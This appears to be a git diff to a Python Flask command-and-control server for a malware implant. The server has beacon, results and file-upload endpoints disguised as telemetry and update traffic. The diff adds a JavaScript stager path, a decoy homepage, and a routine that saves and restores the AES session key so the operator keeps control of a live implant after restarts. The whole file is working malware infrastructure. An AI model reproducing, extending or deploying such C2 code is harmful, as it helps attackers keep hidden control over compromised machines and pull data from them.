@@ -14,14 +14,15 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import serialization
 
 app = Flask(__name__)
+HOST = ""  # put your local ip here
+PORT = 8443
 tasks = []
 results = []
-HOST = "127.0.0.1"
-PORT = 8443
+UPLOAD_FOLDER = "uploads"
+STAGER_ENDPOINT = "/cdn/bootstrap.js"
 BEACON_ENDPOINT = "/api/telemetry"
 RESULTS_ENDPOINT = "/api/updates"
 FILE_ENDPOINT = "/api/upload"
-UPLOAD_FOLDER = "uploads"
 derived_key = None
 
 
@@ -81,7 +82,32 @@ def exchange_keys(client_public_bytes: bytes) -> bytes:
         info=b"handshake data",
     ).derive(shared_secret)
 
+    # save key to disk for backup
+    print("[*] Saving to 'cert/derived.key'...")
+    with open("cert/derived.key", "wb") as f:
+        f.write(shared_key)
+
     return shared_key, server_public_bytes
+
+
+def restore_key() -> bytes:
+    """
+    If the C2 stops for any reason while the implant is still active, it will lose the derived AES
+    key. This would effectively prevent it from communicating with the implant which expects
+    encrypted messages, even for stopping the implant or getting a new key since only the client can
+    initiate key exchange. If this happens, we attempt to recover it from the backup saved in
+    "cert/derived.key"
+    """
+    # create "derived.key" if it doesn't exist
+    if not os.path.exists("cert/derived.key"):
+        print("[!] 'cert/derived.key' not found, creating empty file...")
+        with open("cert/derived.key", "wb") as f:
+            return
+
+    print("[*] Restoring derived key from last session...")
+    with open("cert/derived.key", "rb") as f:
+        shared_key = f.read()
+    return shared_key
 
 
 @app.route(BEACON_ENDPOINT, methods=["POST"])
@@ -186,15 +212,16 @@ def destroy():
 
 @app.route("/view")
 def view_results():
-    # operator calls this endpoint to view results
+    """Operator calls this endpoint to view results"""
     return jsonify(results)
 
 
 @app.route("/")
 def show_homepage():
-    return "totally legitimate app, nothing to see here\n"
+    return "<center><h1>totally legitimate app, nothing to see here\n</h1></center>"
 
 
 if __name__ == "__main__":
     context = ("cert/server.crt", "cert/server.key")
+    derived_key = restore_key()
     app.run(host=HOST, port=PORT, ssl_context=context)
